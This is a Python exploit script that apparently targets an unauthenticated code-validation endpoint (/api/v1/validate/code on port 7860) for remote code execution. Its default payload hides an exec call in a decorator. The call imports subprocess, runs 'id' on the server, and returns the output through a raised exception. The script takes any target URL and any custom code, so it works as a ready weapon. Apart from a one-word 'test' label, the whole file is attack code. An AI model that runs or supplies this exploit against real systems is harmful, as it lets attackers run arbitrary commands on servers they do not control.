import argparse
import requests

def send_payload(target_url, code_payload):
    headers = {
        "Accept-Encoding": "gzip, deflate, br",
        "Accept": "*/*",
        "Accept-Language": "en-US;q=0.9,en;q=0.8",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "Connection": "close",
        "Cache-Control": "max-age=0",
        "Content-Type": "application/json",
    }

    payload = {
        "code": code_payload
    }

    try:
        response = requests.post(target_url, headers=headers, json=payload, timeout=10)
        print("[Status Code]:", response.status_code)
        print("[Response Body]:")
        print(response.text)
    except requests.RequestException as e:
        print("[Error]:", e)

def main():
    parser = argparse.ArgumentParser(description="Send test payload to /api/v1/validate/code endpoint.")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., http://localhost:7860/api/v1/validate/code)")
    parser.add_argument("-c", "--code", required=False, help="Code payload to send")

    args = parser.parse_args()

    # 默认 payload
    default_payload = "@exec(\"raise Exception(__import__('subprocess').check_output(['id']).decode())\")\ndef foo():\n  pass"
    code_payload = args.code if args.code else default_payload

    send_payload(args.url, code_payload)

if __name__ == "__main__":
    main()
